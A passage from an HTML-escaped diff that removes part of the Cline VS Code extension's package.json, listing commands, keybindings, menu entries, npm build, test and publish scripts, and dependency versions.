\&quot;cline.explainCode\&quot;,\n-\t\t\t\t\&quot;title\&quot;: \&quot;Explain with Cline\&quot;,\n-\t\t\t\t\&quot;category\&quot;: \&quot;Cline\&quot;\n-\t\t\t},\n-\t\t\t{\n-\t\t\t\t\&quot;command\&quot;: \&quot;cline.improveCode\&quot;,\n-\t\t\t\t\&quot;title\&quot;: \&quot;Improve with Cline\&quot;,\n-\t\t\t\t\&quot;category\&quot;: \&quot;Cline\&quot;\n-\t\t\t},\n-\t\t\t{\n-\t\t\t\t\&quot;command\&quot;: \&quot;cline.jupyterGenerateCell\&quot;,\n-\t\t\t\t\&quot;title\&quot;: \&quot;Generate Jupyter Cell with Cline\&quot;,\n-\t\t\t\t\&quot;category\&quot;: \&quot;Cline\&quot;,\n-\t\t\t\t\&quot;icon\&quot;: \&quot;$(sparkle)\&quot;\n-\t\t\t},\n-\t\t\t{\n-\t\t\t\t\&quot;command\&quot;: \&quot;cline.jupyterExplainCell\&quot;,\n-\t\t\t\t\&quot;title\&quot;: \&quot;Explain Jupyter Cell with Cline\&quot;,\n-\t\t\t\t\&quot;category\&quot;: \&quot;Cline\&quot;,\n-\t\t\t\t\&quot;icon\&quot;: \&quot;$(question)\&quot;\n-\t\t\t},\n-\t\t\t{\n-\t\t\t\t\&quot;command\&quot;: \&quot;cline.jupyterImproveCell\&quot;,\n-\t\t\t\t\&quot;title\&quot;: \&quot;Improve Jupyter Cell with Cline\&quot;,\n-\t\t\t\t\&quot;category\&quot;: \&quot;Cline\&quot;,\n-\t\t\t\t\&quot;icon\&quot;: \&quot;$(lightbulb)\&quot;\n-\t\t\t},\n-\t\t\t{\n-\t\t\t\t\&quot;command\&quot;: \&quot;cline.openWalkthrough\&quot;,\n-\t\t\t\t\&quot;title\&quot;: \&quot;Open Walkthrough\&quot;,\n-\t\t\t\t\&quot;category\&quot;: \&quot;Cline\&quot;\n-\t\t\t},\n-\t\t\t{\n-\t\t\t\t\&quot;command\&quot;: \&quot;cline.reconstructTaskHistory\&quot;,\n-\t\t\t\t\&quot;title\&quot;: \&quot;Reconstruct Task History\&quot;,\n-\t\t\t\t\&quot;category\&quot;: \&quot;Cline\&quot;\n-\t\t\t},\n-\t\t\t{\n-\t\t\t\t\&quot;command\&quot;: \&quot;cline.reviewComment.reply\&quot;,\n-\t\t\t\t\&quot;title\&quot;: \&quot;Reply\&quot;,\n-\t\t\t\t\&quot;category\&quot;: \&quot;Cline\&quot;,\n-\t\t\t\t\&quot;enablement\&quot;: \&quot;!commentIsEmpty\&quot;\n-\t\t\t},\n-\t\t\t{\n-\t\t\t\t\&quot;command\&quot;: \&quot;cline.reviewComment.addToChat\&quot;,\n-\t\t\t\t\&quot;title\&quot;: \&quot;Add to Cline Chat\&quot;,\n-\t\t\t\t\&quot;category\&quot;: \&quot;Cline\&quot;,\n-\t\t\t\t\&quot;icon\&quot;: \&quot;$(link-external)\&quot;\n-\t\t\t}\n-\t\t],\n-\t\t\&quot;keybindings\&quot;: [\n-\t\t\t{\n-\t\t\t\t\&quot;command\&quot;: \&quot;editor.action.submitComment\&quot;,\n-\t\t\t\t\&quot;key\&quot;: \&quot;enter\&quot;,\n-\t\t\t\t\&quot;when\&quot;: \&quot;commentEditorFocused &amp;&amp; commentController == cline-ai-review &amp;&amp; !commentIsEmpty\&quot;\n-\t\t\t},\n-\t\t\t{\n-\t\t\t\t\&quot;command\&quot;: \&quot;cline.addToChat\&quot;,\n-\t\t\t\t\&quot;key\&quot;: \&quot;cmd+&#x27;\&quot;,\n-\t\t\t\t\&quot;mac\&quot;: \&quot;cmd+&#x27;\&quot;,\n-\t\t\t\t\&quot;win\&quot;: \&quot;ctrl+&#x27;\&quot;,\n-\t\t\t\t\&quot;linux\&quot;: \&quot;ctrl+&#x27;\&quot;,\n-\t\t\t\t\&quot;when\&quot;: \&quot;editorHasSelection\&quot;\n-\t\t\t},\n-\t\t\t{\n-\t\t\t\t\&quot;command\&quot;: \&quot;cline.generateGitCommitMessage\&quot;,\n-\t\t\t\t\&quot;when\&quot;: \&quot;config.git.enabled &amp;&amp; scmProvider == git\&quot;\n-\t\t\t},\n-\t\t\t{\n-\t\t\t\t\&quot;command\&quot;: \&quot;cline.focusChatInput\&quot;,\n-\t\t\t\t\&quot;key\&quot;: \&quot;cmd+&#x27;\&quot;,\n-\t\t\t\t\&quot;mac\&quot;: \&quot;cmd+&#x27;\&quot;,\n-\t\t\t\t\&quot;win\&quot;: \&quot;ctrl+&#x27;\&quot;,\n-\t\t\t\t\&quot;linux\&quot;: \&quot;ctrl+&#x27;\&quot;,\n-\t\t\t\t\&quot;when\&quot;: \&quot;!editorHasSelection\&quot;\n-\t\t\t}\n-\t\t],\n-\t\t\&quot;menus\&quot;: {\n-\t\t\t\&quot;view/title\&quot;: [\n-\t\t\t\t{\n-\t\t\t\t\t\&quot;command\&quot;: \&quot;cline.plusButtonClicked\&quot;,\n-\t\t\t\t\t\&quot;group\&quot;: \&quot;navigation@1\&quot;,\n-\t\t\t\t\t\&quot;when\&quot;: \&quot;view == claude-dev.SidebarProvider\&quot;\n-\t\t\t\t},\n-\t\t\t\t{\n-\t\t\t\t\t\&quot;command\&quot;: \&quot;cline.mcpButtonClicked\&quot;,\n-\t\t\t\t\t\&quot;group\&quot;: \&quot;navigation@2\&quot;,\n-\t\t\t\t\t\&quot;when\&quot;: \&quot;view == claude-dev.SidebarProvider\&quot;\n-\t\t\t\t},\n-\t\t\t\t{\n-\t\t\t\t\t\&quot;command\&quot;: \&quot;cline.historyButtonClicked\&quot;,\n-\t\t\t\t\t\&quot;group\&quot;: \&quot;navigation@3\&quot;,\n-\t\t\t\t\t\&quot;when\&quot;: \&quot;view == claude-dev.SidebarProvider\&quot;\n-\t\t\t\t},\n-\t\t\t\t{\n-\t\t\t\t\t\&quot;command\&quot;: \&quot;cline.accountButtonClicked\&quot;,\n-\t\t\t\t\t\&quot;group\&quot;: \&quot;navigation@5\&quot;,\n-\t\t\t\t\t\&quot;when\&quot;: \&quot;view == claude-dev.SidebarProvider\&quot;\n-\t\t\t\t},\n-\t\t\t\t{\n-\t\t\t\t\t\&quot;command\&quot;: \&quot;cline.settingsButtonClicked\&quot;,\n-\t\t\t\t\t\&quot;group\&quot;: \&quot;navigation@6\&quot;,\n-\t\t\t\t\t\&quot;when\&quot;: \&quot;view == claude-dev.SidebarProvider\&quot;\n-\t\t\t\t}\n-\t\t\t],\n-\t\t\t\&quot;editor/context\&quot;: [\n-\t\t\t\t{\n-\t\t\t\t\t\&quot;command\&quot;: \&quot;cline.addToChat\&quot;,\n-\t\t\t\t\t\&quot;group\&quot;: \&quot;navigation\&quot;,\n-\t\t\t\t\t\&quot;when\&quot;: \&quot;editorHasSelection\&quot;\n-\t\t\t\t}\n-\t\t\t],\n-\t\t\t\&quot;terminal/context\&quot;: [\n-\t\t\t\t{\n-\t\t\t\t\t\&quot;command\&quot;: \&quot;cline.addTerminalOutputToChat\&quot;,\n-\t\t\t\t\t\&quot;group\&quot;: \&quot;navigation\&quot;\n-\t\t\t\t}\n-\t\t\t],\n-\t\t\t\&quot;scm/title\&quot;: [\n-\t\t\t\t{\n-\t\t\t\t\t\&quot;command\&quot;: \&quot;cline.generateGitCommitMessage\&quot;,\n-\t\t\t\t\t\&quot;group\&quot;: \&quot;navigation\&quot;,\n-\t\t\t\t\t\&quot;when\&quot;: \&quot;config.git.enabled &amp;&amp; scmProvider == git &amp;&amp; !cline.isGeneratingCommit\&quot;\n-\t\t\t\t},\n-\t\t\t\t{\n-\t\t\t\t\t\&quot;command\&quot;: \&quot;cline.abortGitCommitMessage\&quot;,\n-\t\t\t\t\t\&quot;group\&quot;: \&quot;navigation\&quot;,\n-\t\t\t\t\t\&quot;when\&quot;: \&quot;config.git.enabled &amp;&amp; scmProvider == git &amp;&amp; cline.isGeneratingCommit\&quot;\n-\t\t\t\t}\n-\t\t\t],\n-\t\t\t\&quot;notebook/toolbar\&quot;: [\n-\t\t\t\t{\n-\t\t\t\t\t\&quot;command\&quot;: \&quot;cline.jupyterGenerateCell\&quot;,\n-\t\t\t\t\t\&quot;group\&quot;: \&quot;navigation/add@1\&quot;,\n-\t\t\t\t\t\&quot;when\&quot;: \&quot;notebookType == &#x27;jupyter-notebook&#x27;\&quot;\n-\t\t\t\t}\n-\t\t\t],\n-\t\t\t\&quot;notebook/cell/title\&quot;: [\n-\t\t\t\t{\n-\t\t\t\t\t\&quot;command\&quot;: \&quot;cline.jupyterExplainCell\&quot;,\n-\t\t\t\t\t\&quot;group\&quot;: \&quot;inline@1\&quot;,\n-\t\t\t\t\t\&quot;when\&quot;: \&quot;notebookType == &#x27;jupyter-notebook&#x27;\&quot;\n-\t\t\t\t},\n-\t\t\t\t{\n-\t\t\t\t\t\&quot;command\&quot;: \&quot;cline.jupyterImproveCell\&quot;,\n-\t\t\t\t\t\&quot;group\&quot;: \&quot;inline@2\&quot;,\n-\t\t\t\t\t\&quot;when\&quot;: \&quot;notebookType == &#x27;jupyter-notebook&#x27;\&quot;\n-\t\t\t\t}\n-\t\t\t],\n-\t\t\t\&quot;commandPalette\&quot;: [\n-\t\t\t\t{\n-\t\t\t\t\t\&quot;command\&quot;: \&quot;cline.generateGitCommitMessage\&quot;,\n-\t\t\t\t\t\&quot;when\&quot;: \&quot;config.git.enabled &amp;&amp; !cline.isGeneratingCommit\&quot;\n-\t\t\t\t},\n-\t\t\t\t{\n-\t\t\t\t\t\&quot;command\&quot;: \&quot;cline.abortGitCommitMessage\&quot;,\n-\t\t\t\t\t\&quot;when\&quot;: \&quot;config.git.enabled &amp;&amp; cline.isGeneratingCommit\&quot;\n-\t\t\t\t},\n-\t\t\t\t{\n-\t\t\t\t\t\&quot;command\&quot;: \&quot;cline.reviewComment.reply\&quot;,\n-\t\t\t\t\t\&quot;when\&quot;: \&quot;false\&quot;\n-\t\t\t\t}\n-\t\t\t],\n-\t\t\t\&quot;comments/commentThread/context\&quot;: [\n-\t\t\t\t{\n-\t\t\t\t\t\&quot;command\&quot;: \&quot;cline.reviewComment.reply\&quot;,\n-\t\t\t\t\t\&quot;group\&quot;: \&quot;inline\&quot;,\n-\t\t\t\t\t\&quot;when\&quot;: \&quot;commentController == cline-ai-review\&quot;\n-\t\t\t\t}\n-\t\t\t],\n-\t\t\t\&quot;comments/commentThread/title\&quot;: [\n-\t\t\t\t{\n-\t\t\t\t\t\&quot;command\&quot;: \&quot;cline.reviewComment.addToChat\&quot;,\n-\t\t\t\t\t\&quot;group\&quot;: \&quot;inline\&quot;,\n-\t\t\t\t\t\&quot;when\&quot;: \&quot;commentController == cline-ai-review\&quot;\n-\t\t\t\t}\n-\t\t\t]\n-\t\t},\n-\t\t\&quot;configuration\&quot;: {\n-\t\t\t\&quot;title\&quot;: \&quot;Cline\&quot;,\n-\t\t\t\&quot;properties\&quot;: {}\n-\t\t}\n-\t},\n-\t\&quot;scripts\&quot;: {\n-\t\t\&quot;vscode:prepublish\&quot;: \&quot;npm run package\&quot;,\n-\t\t\&quot;compile\&quot;: \&quot;npm run check-types &amp;&amp; npm run lint &amp;&amp; node esbuild.mjs\&quot;,\n-\t\t\&quot;compile-standalone\&quot;: \&quot;npm run check-types &amp;&amp; npm run lint &amp;&amp; node esbuild.mjs --standalone\&quot;,\n-\t\t\&quot;compile-standalone-npm\&quot;: \&quot;npm run protos &amp;&amp; npm run protos-go &amp;&amp; npm run check-types &amp;&amp; npm run lint &amp;&amp; node esbuild.mjs --standalone\&quot;,\n-\t\t\&quot;compile-cli\&quot;: \&quot;scripts/build-cli.sh\&quot;,\n-\t\t\&quot;compile-cli-all-platforms\&quot;: \&quot;scripts/build-cli-all-platforms.sh\&quot;,\n-\t\t\&quot;compile-cli-man-page\&quot;: \&quot;pandoc cli/man/cline.1.md -s -t man -o cli/man/cline.1\&quot;,\n-\t\t\&quot;test:install\&quot;: \&quot;bash scripts/test-install.sh\&quot;,\n-\t\t\&quot;dev:cli:watch\&quot;: \&quot;node scripts/dev-cli-watch.mjs\&quot;,\n-\t\t\&quot;postcompile-standalone\&quot;: \&quot;node scripts/package-standalone.mjs\&quot;,\n-\t\t\&quot;postcompile-standalone-npm\&quot;: \&quot;node scripts/package-npm.mjs\&quot;,\n-\t\t\&quot;dev\&quot;: \&quot;npm run protos &amp;&amp; npm run watch\&quot;,\n-\t\t\&quot;watch\&quot;: \&quot;npm-run-all -p watch:*\&quot;,\n-\t\t\&quot;watch:esbuild\&quot;: \&quot;node esbuild.mjs --watch\&quot;,\n-\t\t\&quot;watch:tsc\&quot;: \&quot;tsc --noEmit --watch --project tsconfig.json\&quot;,\n-\t\t\&quot;package\&quot;: \&quot;npm run check-types &amp;&amp; npm run build:webview &amp;&amp; npm run lint &amp;&amp; node esbuild.mjs --production\&quot;,\n-\t\t\&quot;protos\&quot;: \&quot;node scripts/build-proto.mjs\&quot;,\n-\t\t\&quot;protos-go\&quot;: \&quot;node scripts/build-go-proto.mjs\&quot;,\n-\t\t\&quot;protos-python\&quot;: \&quot;node scripts/build-python-proto.mjs\&quot;,\n-\t\t\&quot;cli-providers\&quot;: \&quot;node scripts/cli-providers.mjs\&quot;,\n-\t\t\&quot;download-ripgrep\&quot;: \&quot;node scripts/download-ripgrep.mjs\&quot;,\n-\t\t\&quot;postprotos\&quot;: \&quot;biome format src/shared/proto src/core/controller src/hosts/ webview-ui/src/services src/generated --write --no-errors-on-unmatched\&quot;,\n-\t\t\&quot;clean:build\&quot;: \&quot;rimraf dist dist-standalone webview-ui/build src/generated out/\&quot;,\n-\t\t\&quot;clean:deps\&quot;: \&quot;rimraf node_modules webview-ui/node_modules\&quot;,\n-\t\t\&quot;clean:all\&quot;: \&quot;npm run clean:build &amp;&amp; npm run clean:deps\&quot;,\n-\t\t\&quot;compile-tests\&quot;: \&quot;node ./scripts/build-tests.js\&quot;,\n-\t\t\&quot;watch-tests\&quot;: \&quot;tsc -p . -w --outDir out\&quot;,\n-\t\t\&quot;check-types\&quot;: \&quot;npm run protos &amp;&amp; npx tsc --noEmit &amp;&amp; cd webview-ui &amp;&amp; npx tsc --noEmit\&quot;,\n-\t\t\&quot;lint\&quot;: \&quot;biome lint --no-errors-on-unmatched --files-ignore-unknown=true --diagnostic-level=error &amp;&amp; npm run lint:proto\&quot;,\n-\t\t\&quot;lint:proto\&quot;: \&quot;bash ./scripts/proto-lint.sh\&quot;,\n-\t\t\&quot;format\&quot;: \&quot;biome format --changed --no-errors-on-unmatched --files-ignore-unknown=true --diagnostic-level=error\&quot;,\n-\t\t\&quot;format:fix\&quot;: \&quot;biome check --changed --no-errors-on-unmatched --files-ignore-unknown=true --write\&quot;,\n-\t\t\&quot;fix:all\&quot;: \&quot;biome check --no-errors-on-unmatched --files-ignore-unknown=true --write --diagnostic-level=error --unsafe\&quot;,\n-\t\t\&quot;ci:check-all\&quot;: \&quot;npm-run-all -p check-types lint format\&quot;,\n-\t\t\&quot;ci:build\&quot;: \&quot;npm run protos &amp;&amp; npm run build:webview &amp;&amp; node esbuild.mjs &amp;&amp; npm run compile-tests\&quot;,\n-\t\t\&quot;pretest\&quot;: \&quot;npm run compile &amp;&amp; npm run compile-tests &amp;&amp; npm run compile-standalone &amp;&amp; npm run lint\&quot;,\n-\t\t\&quot;test\&quot;: \&quot;npm-run-all test:unit test:integration\&quot;,\n-\t\t\&quot;test:integration\&quot;: \&quot;vscode-test\&quot;,\n-\t\t\&quot;test:unit\&quot;: \&quot;cross-env TS_NODE_PROJECT=./tsconfig.unit-test.json mocha\&quot;,\n-\t\t\&quot;test:coverage\&quot;: \&quot;vscode-test --coverage\&quot;,\n-\t\t\&quot;test:sca-server\&quot;: \&quot;npx tsx watch scripts/test-standalone-core-api-server.ts\&quot;,\n-\t\t\&quot;test:tp-orchestrator\&quot;: \&quot;npx tsx scripts/testing-platform-orchestrator.ts\&quot;,\n-\t\t\&quot;e2e\&quot;: \&quot;playwright test -c playwright.config.ts\&quot;,\n-\t\t\&quot;test:e2e:build\&quot;: \&quot;vsce package --allow-package-secrets sendgrid --out dist/e2e.vsix\&quot;,\n-\t\t\&quot;test:e2e\&quot;: \&quot;playwright install &amp;&amp; npm run test:e2e:build &amp;&amp; node src/test/e2e/utils/build.mjs &amp;&amp; playwright test\&quot;,\n-\t\t\&quot;test:e2e:optimal\&quot;: \&quot;npm run test:e2e:build &amp;&amp; node src/test/e2e/utils/build.mjs &amp;&amp; playwright test\&quot;,\n-\t\t\&quot;test:e2e:ui\&quot;: \&quot;npx tsx scripts/interactive-playwright.ts\&quot;,\n-\t\t\&quot;install:all\&quot;: \&quot;npm install &amp;&amp; cd webview-ui &amp;&amp; npm install\&quot;,\n-\t\t\&quot;dev:webview\&quot;: \&quot;cd webview-ui &amp;&amp; npm run dev\&quot;,\n-\t\t\&quot;build:webview\&quot;: \&quot;cd webview-ui &amp;&amp; npm run build\&quot;,\n-\t\t\&quot;test:webview\&quot;: \&quot;cd webview-ui &amp;&amp; npm run test\&quot;,\n-\t\t\&quot;publish:marketplace\&quot;: \&quot;vsce publish --allow-package-secrets sendgrid &amp;&amp; ovsx publish\&quot;,\n-\t\t\&quot;publish:marketplace:prerelease\&quot;: \&quot;vsce publish --allow-package-secrets sendgrid --pre-release &amp;&amp; ovsx publish --pre-release\&quot;,\n-\t\t\&quot;publish:marketplace:nightly\&quot;: \&quot;node ./scripts/publish-nightly.mjs\&quot;,\n-\t\t\&quot;prepare\&quot;: \&quot;husky\&quot;,\n-\t\t\&quot;changeset\&quot;: \&quot;changeset\&quot;,\n-\t\t\&quot;version-packages\&quot;: \&quot;changeset version\&quot;,\n-\t\t\&quot;docs\&quot;: \&quot;cd docs &amp;&amp; npm run dev\&quot;,\n-\t\t\&quot;docs:check-links\&quot;: \&quot;cd docs &amp;&amp; npm run check\&quot;,\n-\t\t\&quot;docs:rename-file\&quot;: \&quot;cd docs &amp;&amp; npm run rename\&quot;,\n-\t\t\&quot;report-issue\&quot;: \&quot;node scripts/report-issue.js\&quot;,\n-\t\t\&quot;storybook\&quot;: \&quot;cd webview-ui &amp;&amp; npm run storybook\&quot;\n-\t},\n-\t\&quot;lint-staged\&quot;: {\n-\t\t\&quot;src/shared/storage/state-keys.ts\&quot;: [\n-\t\t\t\&quot;node scripts/generate-state-proto.mjs\&quot;,\n-\t\t\t\&quot;git add proto/cline/state.proto\&quot;\n-\t\t],\n-\t\t\&quot;*\&quot;: [\n-\t\t\t\&quot;biome check --write --staged --no-errors-on-unmatched --files-ignore-unknown=true\&quot;\n-\t\t]\n-\t},\n-\t\&quot;devDependencies\&quot;: {\n-\t\t\&quot;@biomejs/biome\&quot;: \&quot;^2.1.4\&quot;,\n-\t\t\&quot;@bufbuild/buf\&quot;: \&quot;^1.54.0\&quot;,\n-\t\t\&quot;@changesets/cli\&quot;: \&quot;^2.27.12\&quot;,\n-\t\t\&quot;@types/better-sqlite3\&quot;: \&quot;^7.6.13\&quot;,\n-\t\t\&quot;@types/chai\&quot;: \&quot;^5.0.1\&quot;,\n-\t\t\&quot;@types/clone-deep\&quot;: \&quot;^4.0.4\&quot;,\n-\t\t\&quot;@types/diff\&quot;: \&quot;^5.2.1\&quot;,\n-\t\t\&quot;@types/get-folder-size\&quot;: \&quot;^3.0.4\&quot;,\n-\t\t\&quot;@types/js-yaml\&quot;: \&quot;^4.0.9\&quot;,\n-\t\t\&quot;@types/mocha\&quot;: \&quot;^10.0.7\&quot;,\n-\t\t\&quot;@types/node\&quot;: \&quot;20.x\&quot;,\n-\t\t\&quot;@types/pdf-parse\&quot;: \&quot;^1.1.4\&quot;,\n-\t\t\&quot;@types/proxyquire\&quot;: \&quot;^1.3.31\&quot;,\n-\t\t\&quot;@types/shell-quote\&quot;: \&quot;^1.7.5\&quot;,\n-\t\t\&quot;@types/should\&quot;: \&quot;^11.2.0\&quot;,\n-\t\t\&quot;@types/sinon\&quot;: \&quot;^17.0.4\&quot;,\n-\t\t\&quot;@types/turndown\&quot;: \&quot;^5.0.5\&quot;,\n-\t\t\&quot;@types/vscode\&quot;: \&quot;1.84.0\&quot;,\n-\t\t\&quot;@vscode/test-cli\&quot;: \&quot;^0.0.10\&quot;,\n-\t\t\&quot;@vscode/test-electron\&quot;: \&quot;^2.5.2\&quot;,\n-\t\t\&quot;@vscode/vsce\&quot;: \&quot;^3.6.0\&quot;,\n-\t\t\&quot;c8\&quot;: \&quot;^10.1.3\&quot;,\n-\t\t\&quot;chai\&quot;: \&quot;^4.3.10\&quot;,\n-\t\t\&quot;chalk\&quot;: \&quot;5.6.2\&quot;,\n-\t\t\&quot;cross-env\&quot;: \&quot;^10.1.0\&quot;,\n-\t\t\&quot;esbuild\&quot;: \&quot;^0.25.0\&quot;,\n-\t\t\&quot;grpc-tools\&quot;: \&quot;^1.13.0\&quot;,\n-\t\t\&quot;husky\&quot;: \&quot;^9.1.7\&quot;,\n-\t\t\&quot;lint-staged\&quot;: \&quot;^16.1.0\&quot;,\n-\t\t\&quot;minimatch\&quot;: \&quot;^3.0.3\&quot;,\n-\t\t\&quot;npm-run-all\&quot;: \&quot;^4.1.5\&quot;,\n-\t\t\&quot;nyc\&quot;: \&quot;^17.1.0\&quot;,\n-\t\t\&quot;prebuild-install\&quot;: \&quot;^7.1.3\&quot;,\n-\t\t\&quot;protoc-gen-ts\&quot;: \&quot;^0.8.7\&quot;,\n-\t\t\&quot;proxyquire\&quot;: \&quot;^2.1.3\&quot;,\n-\t\t\&quot;rimraf\&quot;: \&quot;^6.0.1\&quot;,\n-\t\t\&quot;should\&quot;: \&quot;^13.2.3\&quot;,\n-\t\t\&quot;sinon\&quot;: \&quot;^19.0.2\&quot;,\n-\t\t\&quot;tree-kill\&quot;: \&quot;^1.2.2\&quot;,\n-\t\t\&quot;ts-node\&quot;: \&quot;^10.9.2\&quot;,\n-\t\t\&quot;ts-proto\&quot;: \&quot;^2.6.1\&quot;,\n-\t\t\&quot;tsconfig-paths\&quot;: \&quot;^4.2.0\&quot;,\n-\t\t\&quot;typescript\&quot;: \&quot;^5.4.5\&quot;\n-\t},\n-\t\&quot;dependencies\&quot;: {\n-\t\t\&quot;@anthropic-ai/sdk\&quot;: \&quot;^0.37.0\&quot;,\n-\t\t\&quot;@anthropic-ai/vertex-sdk\&quot;: \&quot;^0.6.4\&quot;,\n-\t\t\&quot;@aws-sdk/client-bedrock-runtime\&quot;: \&quot;^3.922.0\&quot;,\n-\t\t\&quot;@aws-sdk/credential-providers\&quot;: \&quot;^3.922.0\&quot;,\n-\t\t\&quot;@azure/identity\&quot;: \&quot;^4.13.0\&quot;,\n-\t\t\&quot;@bufbuild/protobuf\&quot;: \&quot;^2.2.5\&quot;,\n-\t\t\&quot;@cerebras/cerebras_cloud_sdk\&quot;: \&quot;^1.35.0\&quot;,\n-\t\t\&quot;@google-cloud/vertexai\&quot;: \&quot;^1.9.3\&quot;,\n-\t\t\&quot;@google/genai\&quot;: \&quot;^1.30.0\&quot;,\n-\t\t\&quot;@grpc/grpc-js\&quot;: \&quot;^1.9.15\&quot;,\n-\t\t\&quot;@grpc/reflection\&quot;: \&quot;^1.0.4\&quot;,\n-\t\t\&quot;@mistralai/mistralai\&quot;: \&quot;^1.5.0\&quot;,\n-\t\t\&quot;@modelcontextprotocol/sdk\&quot;: \&quot;^1.25.1\&quot;,\n-\t\t\&quot;@opentelemetry/api\&quot;: \&quot;^1.9.0\&quot;,\n-\t\t\&quot;@opentelemetry/core\&quot;: \&quot;^2.1.0\&quot;,\n-\t\t\&quot;@opentelemetry/exporter-logs-otlp-grpc\&quot;: \&quot;^0.56.0\&quot;,\n-\t\t\&quot;@opentelemetry/exporter-logs-otlp-http\&quot;: \&quot;^0.56.0\&quot;,\n-\t\t\&quot;@opentelemetry/exporter-logs-otlp-proto\&quot;: \&quot;^0.56.0\&quot;,\n-\t\t\&quot;@opentelemetry/exporter-metrics-otlp-grpc\&quot;: \&quot;^0.56.0\&quot;,\n-\t\t\&quot;@opentelemetry/exporter-metrics-otlp-http\&quot;: \&quot;^0.56.0\&quot;,\n-\t\t\&quot;@opentelemetry/exporter-metrics-otlp-proto\&quot;: \&quot;^0.56.0\&quot;,\n-\t\t\&quot;@opentelemetry/exporter-prometheus\&quot;: \&quot;^0.56.0\&quot;,\n-\t\t\&quot;@opentelemetry/exporter-trace-otlp-http\&quot;: \&quot;^0.56.0\&quot;,\n-\t\t\&quot;@opentelemetry/instrumentation\&quot;: \&quot;^0.205.0\&quot;,\n-\t\t\&quot;@opentelemetry/instrumentation-http\&quot;: \&quot;^0.205.0\&quot;,\n-\t\t\&quot;@opentelemetry/resources\&quot;: \&quot;^1.30.1\&quot;,\n-\t\t\&quot;@opentelemetry/sdk-logs\&quot;: \&quot;^0.56.0\&quot;,\n-\t\t\&quot;@opentelemetry/sdk-metrics\&quot;: \&quot;^1.30.1\&quot;,\n-\t\t\&quot;@opentelemetry/sdk-node\&quot;: \&quot;^0.56.0\&quot;,\n-\t\t\&quot;@opentelemetry/sdk-trace-base\&quot;: \&quot;^2.1.0\&quot;,\n-\t\t\&quot;@opentelemetry/sdk-trace-node\&quot;: \&quot;^1.30.1\&quot;,\n-\t\t\&quot;@opentelemetry/semantic-conventions\&quot;: \&quot;^1.37.0\&quot;,\n-\t\t\&quot;@playwright/test\&quot;: \&quot;^1.55.1\&quot;,\n-\t\t\&quot;@sap-ai-sdk/ai-api\&quot;: \&quot;^2.1.0\&quot;,\n-\t\t\&quot;@sap-ai-sdk/orchestration\&quot;: \&quot;^2.1.0\&quot;,\n-\t\t\&quot;@sap-cloud-sdk/connectivity\&quot;: \&quot;^4.2.0\&quot;,\n-\t\t\&quot;@streamparser/json\&quot;: \&quot;^0.0.22\&quot;,\n-\t\t\&quot;@tailwindcss/vite\&quot;: \&quot;^4.1.14\&quot;,\n-\t\t\&quot;@types/uuid\&quot;: \&quot;^10.0.0\&quot;,\n-\t\t\&quot;@vscode/codicons\&quot;: \&quot;^0.0.36\&quot;,\n-\t\t\&quot;archiver\&quot;: \&quot;^7.0.1\&quot;,\n-\t\t\&quot;aws4fetch\&quot;: \&quot;^1.0.20\&quot;,\n-\t\t\&quot;axios\&quot;: \&quot;^1.12.0\&quot;,\n-\t\t\&quot;better-sqlite3\&quot;: \&quot;^12.4.1\&quot;,\n-\t\t\&quot;cheerio\&quot;: \&quot;^1.0.0\&quot;,\n-\t\t\&quot;chokidar\&quot;: \&quot;^4.0.1\&quot;,\n-\t\t\&quot;chrome-launcher\&quot;: \&quot;^1.1.2\&quot;,\n-\t\t\&quot;clone-deep\&quot;: \&quot;^4.0.1\&quot;,\n-\t\t\&quot;default-shell\&quot;: \&quot;^2.2.0\&quot;,\n-\t\t\&quot;diff\&quot;: \&quot;^5.2.0\&quot;,\n-\t\t\&quot;exceljs\&quot;: \&quot;^4.4.0\&quot;,\n-\t\t\&quot;execa\&quot;: \&quot;^9.5.2\&quot;,\n-\t\t\&quot;fast-deep-equal\&quot;: \&quot;^3.1.3\&quot;,\n-\t\t\&quot;fzf\&quot;: \&quot;^0.5.2\&quot;,\n-\t\t\&quot;get-folder-size\&quot;: \&quot;^5.0.0\&quot;,\n-\t\t\&quot;globby\&quot;: \&quot;^14.0.2\&quot;,\n-\t\t\&quot;grpc-health-check\&quot;: \&quot;^2.0.2\&quot;,\n-\t\t\&quot;iconv-lite\&quot;: \&quot;^0.6.3\&quot;,\n-\t\t\&quot;ignore\&quot;: \&quot;^7.0.3\&quot;,\n-\t\t\&quot;image-size\&quot;: \&quot;^2.0.2\&quot;,\n-\t\t\&quot;isbinaryfile\&quot;: \&quot;^5.0.2\&quot;,\n-\t\t\&quot;jschardet\&quot;: \&quot;^3.1.4\&quot;,\n-\t\t\&quot;json5\&quot;: \&quot;^2.2.3\&quot;,\n-\t\t\&quot;mammoth\&quot;: \&quot;^1.11.0\&quot;,\n-\t\t\&quot;nanoid\&quot;: \&quot;^5.1.6\&quot;,\n-\t\t\&quot;nice-grpc\&quot;: \&quot;^2.1.12\&quot;,\n-\t\t\&quot;node-machine-id\&quot;: \&quot;^1.1.12\&quot;,\n-\t\t\&quot;ollama\&quot;: \&quot;^0.5.13\&quot;,\n-\t\t\&quot;open\&quot;: \&quot;^10.1.2\&quot;,\n-\t\t\&quot;open-graph-scraper\&quot;: \&quot;^6.9.0\&quot;,\n-\t\t\&quot;openai\&quot;: \&quot;^6.9.0\&quot;,\n-\t\t\&quot;os-name\&quot;: \&quot;^6.0.0\&quot;,\n-\t\t\&quot;p-mutex\&quot;: \&quot;^1.0.0\&quot;,\n-\t\t\&quot;p-timeout\&quot;: \&quot;^6.1.4\&quot;,\n-\t\t\&quot;p-wait-for\&quot;: \&quot;^5.0.2\&quot;,\n-\t\t\&quot;pdf-parse\&quot;: \&quot;^1.1.1\&quot;,\n-\t\t\&quot;picomatch\&quot;: \&quot;^4.0.3\&quot;,\n-\t\t\&quot;posthog-node\&quot;: \&quot;^5.8.0\&quot;,\n-\t\t\&quot;puppeteer-chromium-resolver\&quot;: \&quot;^23.0.0\&quot;,\n-\t\t\&quot;puppeteer-core\&quot;: \&quot;^23.4.0\&quot;,\n-\t\t\&quot;reconnecting-eventsource\&quot;: \&quot;^1.6.4\&quot;,\n-\t\t\&quot;serialize-error\&quot;: \&quot;^11.0.3\&quot;,\n-\t\t\&quot;shell-quote\&quot;: \&quot;^1.8.3\&quot;,\n-\t\t\&quot;simple-git\&quot;: \&quot;^3.27.0\&quot;,\n-\t\t\&quot;strip-ansi\&quot;: \&quot;^7.1.2\&quot;,\n-\t\t\&quot;tailwindcss\&quot;: \&quot;^4.1.14\&quot;,\n-\t\t\&quot;tree-sitter-wasms\&quot;: \&quot;^0.1.11\&quot;,\n-\t\t\&quot;ts-morph\&quot;: 